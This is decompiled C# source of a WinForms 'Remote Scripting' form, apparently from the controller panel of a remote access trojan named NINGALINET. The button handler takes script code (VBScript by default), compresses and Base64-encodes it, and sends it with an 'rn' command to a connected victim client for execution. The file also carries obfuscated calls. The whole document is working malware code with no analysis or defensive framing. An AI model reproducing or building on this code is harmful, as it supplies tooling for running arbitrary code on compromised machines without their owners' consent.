using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NINGALINET
{
	// Token: 0x02000022 RID: 34
	[DesignerGenerated]
	public partial class FrmScript : Form
	{
		// Token: 0x060006F0 RID: 1776 RVA: 0x0000436D File Offset: 0x0000256D
		[DebuggerNonUserCode]
		static FrmScript()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmScript.__ENCList = new List<WeakReference>();
		}

		// Token: 0x060006F1 RID: 1777 RVA: 0x0000437E File Offset: 0x0000257E
		public FrmScript()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.Load += new EventHandler(this.FrmScript_Load);
			FrmScript.__ENCAddToList(this);
			this.RunAs = "vbs";
			this.InitializeComponent();
		}

		// Token: 0x060006F2 RID: 1778 RVA: 0x00038EC0 File Offset: 0x000370C0
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmScript.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmScript.__ENCList.Count == FrmScript.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmScript.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmScript.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmScript.__ENCList[num] = FrmScript.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmScript.__ENCList.RemoveRange(num, FrmScript.__ENCList.Count - num);
						FrmScript.__ENCList.Capacity = FrmScript.__ENCList.Count;
					}
					FrmScript.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000291 RID: 657
		// (get) Token: 0x060006F5 RID: 1781 RVA: 0x000391FC File Offset: 0x000373FC
		// (set) Token: 0x060006F6 RID: 1782 RVA: 0x00039214 File Offset: 0x00037414
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000292 RID: 658
		// (get) Token: 0x060006F7 RID: 1783 RVA: 0x0003926C File Offset: 0x0003746C
		// (set) Token: 0x060006F8 RID: 1784 RVA: 0x000043B5 File Offset: 0x000025B5
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x060006F9 RID: 1785 RVA: 0x00039284 File Offset: 0x00037484
		private void Button1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Run As :", "", "vbs", -1, -1);
			if (text.Length > 0)
			{
				this.RunAs = text;
				this.Code = this.TextBox1.Text;
				if (this.Code.Length > 0)
				{
					Client arg_9D_0 = this.sk;
					string[] array = new string[5];
					array[0] = "rn";
					array[1] = ima.Y;
					array[2] = this.RunAs;
					array[3] = ima.Y;
					string[] arg_96_0 = array;
					int arg_96_1 = 4;
					byte[] arg_8C_0 = Fungsi.SB(ref this.Code);
					bool flag = true;
					arg_96_0[arg_96_1] = Convert.ToBase64String(Fungsi.ZIP(arg_8C_0, ref flag));
					arg_9D_0.Send(string.Concat(array));
				}
				this.Close();
			}
		}

		// Token: 0x060006FA RID: 1786 RVA: 0x000043BE File Offset: 0x000025BE
		private void FrmScript_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(Operators.AddObject("Remote Scripting - ", ima.vno(this.sk.L)));
		}

		// Token: 0x04000332 RID: 818
		private static List<WeakReference> __ENCList;

		// Token: 0x04000334 RID: 820
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000335 RID: 821
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000336 RID: 822
		public Client sk;

		// Token: 0x04000337 RID: 823
		public string Code;

		// Token: 0x04000338 RID: 824
		public Form1 F;

		// Token: 0x04000339 RID: 825
		public string RunAs;
	}
}
